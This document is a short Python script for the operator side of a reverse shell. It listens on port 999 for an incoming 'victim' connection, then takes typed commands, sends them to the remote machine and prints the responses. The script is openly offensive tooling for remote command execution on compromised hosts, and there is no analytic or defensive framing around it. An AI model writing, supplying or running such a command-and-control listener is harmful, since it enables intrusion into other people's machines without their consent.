import socket

ip = "0.0.0.0" #this is your server ip (don't change it!!!)
port = 999 #default port, (you can change it)
socket1 = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
socket1.bind((ip,port))
socket1.listen(1)
print("Listening...")
victim_socket , victim_address = socket1.accept()
print(f"Connected to {victim_address}")

while True:
    command = input(">> ")
    if command == "exit":
        victim_socket.sendall(b'exit')
        break
    elif command.strip():
        victim_socket.sendall(command.encode("utf-8"))
        response = victim_socket.recv(4096).decode("utf-8")
        print(response)
victim_socket.close()
socket1.close()
#made by <3